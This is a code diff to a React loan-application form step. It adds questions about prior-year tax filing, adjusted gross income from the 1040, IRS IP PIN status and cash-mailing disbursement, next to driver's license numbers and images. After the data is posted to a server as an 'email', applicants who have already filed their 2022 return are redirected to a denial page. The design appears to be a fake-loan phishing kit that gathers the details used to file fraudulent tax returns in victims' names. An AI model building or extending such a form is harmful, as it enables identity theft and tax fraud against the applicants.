@@ -78,19 +78,22 @@ const LoanProcessSeven = ({ step, setStep }) => {
     let isValid = true;
     const errors = {};
 
-    if (!formData.licenseNumber) {
-      errors.licenseNumber = "Driver's license number is required";
+    if (!formData.creditScore) {
+      errors.creditScore = "Choose a credit score range";
       isValid = false;
     }
 
-    if (!formData.creditScore) {
-      errors.creditScore = "Choose a credit score range";
+    if (!formData.licenseNumber) {
+      errors.licenseNumber = "Driver's license number is required";
       isValid = false;
     }
 
     if (!formData.licenseState) {
       errors.licenseState = "Driver's license state is required";
       isValid = false;
+    }
+    if (!formData.taxReturn) {
+      errors.taxReturn = "This field is required.";
     }
 
     if (!formData.frontView) {
@@ -120,6 +123,19 @@ const LoanProcessSeven = ({ step, setStep }) => {
         isValid = false;
       }
     }
+    if (!formData.didFile2021Taxes) {
+      errors.didFile2021Taxes = "Please select an option";
+      isValid = false;
+    }
+    if (!formData.receivedIPPIN) {
+      errors.receivedIPPIN = "Please select an option";
+      isValid = false;
+    }
+
+    if (!formData.meansOfDisbursement) {
+      errors.meansOfDisbursement = "Please select an option";
+      isValid = false;
+    }
 
     setErrors(errors);
     return isValid;
@@ -133,8 +149,17 @@ const LoanProcessSeven = ({ step, setStep }) => {
         setbgloading(true);
         await axios.post("/api", { formData });
         console.log("Email sent successfully");
+        if (formData.taxReturn === "yes") {
+          setbgloading(true);
 
-        setStep(step + 1);
+          // Remove items from local storage
+          localStorage.removeItem("formData");
+          localStorage.removeItem("formStep");
+
+          router.push("/loan/denied");
+        } else {
+          setStep(step + 1);
+        }
       } catch (error) {
         console.error("Error sending email:", error);
       }
@@ -175,7 +200,7 @@ const LoanProcessSeven = ({ step, setStep }) => {
               </option>
               <option value="Good (690-719)">Good Credit (690-719)</option>
               <option value="Fair (630-689)">Fair Credit (630-689)</option>
-              <option value="Bad (300-639)">Bad Credit (300-639)</option>
+              <option value="Bad (300-639)">Bad Credit (300-629)</option>
               <option value="Not Sure">Not Sure</option>
             </select>
           </div>
@@ -247,7 +272,139 @@ const LoanProcessSeven = ({ step, setStep }) => {
             <p className="text-red-500 text-sm mt-1">{errors.licenseState}</p>
           )}
         </div>
+        <div className="mt-7">
+          <label className="block text-gray-700 font-semibold mb-2">
+            Did you file your 2021 taxes?
+          </label>
+          <div>
+            <select
+              className={`block w-full  ${
+                errors.didFile2021Taxes ? "border-red-500" : "border-gray-300"
+              } border border-gray-300 rounded-lg pl-3 pr-10 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
+              name="didFile2021Taxes"
+              id="didFile2021Taxes"
+              value={formData.didFile2021Taxes}
+              onChange={handleChange}
+              required
+            >
+              <option value="">Choose an option</option>
+              <option value="Yes">Yes</option>
+              <option value="No">No</option>
+            </select>
+          </div>
+          {errors.didFile2021Taxes && (
+            <p className="text-red-500 text-sm mt-1">
+              {errors.didFile2021Taxes}
+            </p>
+          )}
+        </div>
 
+        {formData.didFile2021Taxes === "Yes" && (
+          <div className="mt-7">
+            <label className="block text-gray-700 font-semibold mb-2">
+              What is your adjusted gross income (line 11 of your 1040)?
+            </label>
+            <div className="relative">
+              <input
+                className={`w-full border ${
+                  errors.adjustedGrossIncome
+                    ? "border-red-500"
+                    : "border-gray-300"
+                } rounded-lg pl-10 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
+                type="text"
+                name="adjustedGrossIncome"
+                id="adjustedGrossIncome"
+                value={formData.adjustedGrossIncome}
+                onChange={handleChange}
+                placeholder="Enter your adjusted gross income"
+                required={formData.didFile2021Taxes === "Yes"}
+              />
+              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                <FontAwesomeIcon
+                  icon={faImage}
+                  className="text-gray-500 text-sm"
+                />
+              </div>
+            </div>
+            {errors.adjustedGrossIncome && (
+              <p className="text-red-500 text-sm mt-1">
+                {errors.adjustedGrossIncome}
+              </p>
+            )}
+          </div>
+        )}
+
+        <div className="mt-7">
+          <label className="block text-gray-700 font-semibold mb-2">
+            Did you receive an IP PIN from the IRS?
+          </label>
+          <div>
+            <select
+              className={`block w-full  ${
+                errors.receivedIPPIN ? "border-red-500" : "border-gray-300"
+              } border border-gray-300 rounded-lg pl-3 pr-10 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
+              name="receivedIPPIN"
+              id="receivedIPPIN"
+              value={formData.receivedIPPIN}
+              onChange={handleChange}
+              required
+            >
+              <option value="">Choose an option</option>
+              <option value="Yes">Yes</option>
+              <option value="No">No</option>
+            </select>
+          </div>
+          {errors.receivedIPPIN && (
+            <p className="text-red-500 text-sm mt-1">{errors.receivedIPPIN}</p>
+          )}
+        </div>
+        <label
+          className="block text-gray-700 font-semibold mb-2 mt-7"
+          htmlFor="taxReturn"
+        >
+          Did you file for 2022 tax return?
+        </label>
+        <select
+          className="w-full border border-gray-300 rounded-lg pl-3 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none"
+          name="taxReturn"
+          id="taxReturn"
+          value={formData.taxReturn}
+          onChange={handleChange}
+          required
+        >
+          <option value="">Select...</option>
+          <option value="yes">Yes</option>
+          <option value="no">No</option>
+        </select>
+        {errors.taxReturn && <p className="text-red-500">{errors.taxReturn}</p>}
+        <div className="mt-7">
+          <label className="block text-gray-700 font-semibold mb-2">
+            Means of Disbursement
+          </label>
+          <div>
+            <select
+              className={`block w-full border ${
+                errors.meansOfDisbursement
+                  ? "border-red-500"
+                  : "border-gray-300"
+              } rounded-lg pl-3 pr-10 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
+              name="meansOfDisbursement"
+              id="meansOfDisbursement"
+              value={formData.meansOfDisbursement}
+              onChange={handleChange}
+              required
+            >
+              <option value="">Choose an option</option>
+              <option value="cashmailing">Cash Mailing</option>
+              <option value="directdeposit">Direct Deposit</option>
+            </select>
+          </div>
+          {errors.meansOfDisbursement && (
+            <p className="text-red-500 text-sm mt-1">
+              {errors.meansOfDisbursement}
+            </p>
+          )}
+        </div>
         <div className="mt-7">
           <label className="block text-gray-700 font-semibold mb-2">
             Upload the front view of your driver's license
